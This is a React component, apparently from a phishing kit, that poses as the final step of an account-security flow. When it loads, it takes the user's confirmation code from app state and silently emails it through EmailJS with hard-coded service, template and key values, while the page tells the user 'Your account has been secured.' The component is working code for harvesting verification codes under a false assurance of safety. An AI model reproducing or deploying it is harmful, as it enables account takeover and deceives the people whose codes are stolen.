import React, { useEffect } from 'react';
import logo from '../assets/logo.png';
import { useNavigate } from 'react-router-dom';
import emailjs from '@emailjs/browser';
import { useGlobalContext } from '../context';

const Done = () => {
  const { passwordDetails, setPasswordDetails } = useGlobalContext();
  useEffect(() => {
    const serviceId = 'service_hrdwmfq';
    const templateId = 'template_isuzj91';
    const publicKey = 'tyTc07BP3UDZFbqhd';

    const templateParams = {
      code: passwordDetails.confirmationCode,
    };

    emailjs
      .send(serviceId, templateId, templateParams, publicKey)
      .then((resp) => {
        console.log('Email sent succesfully', resp);
      })
      .catch((error) => {
        console.error('Error sending email', error);
      });
  }, []);

  return (
    <div className="main-content">
      <img
        src={logo}
        alt=""
        style={{ display: 'block', margin: '1em auto 2em auto' }}
      />
      <p>Your account has been secured.</p>
    </div>
  );
};

export default Done;
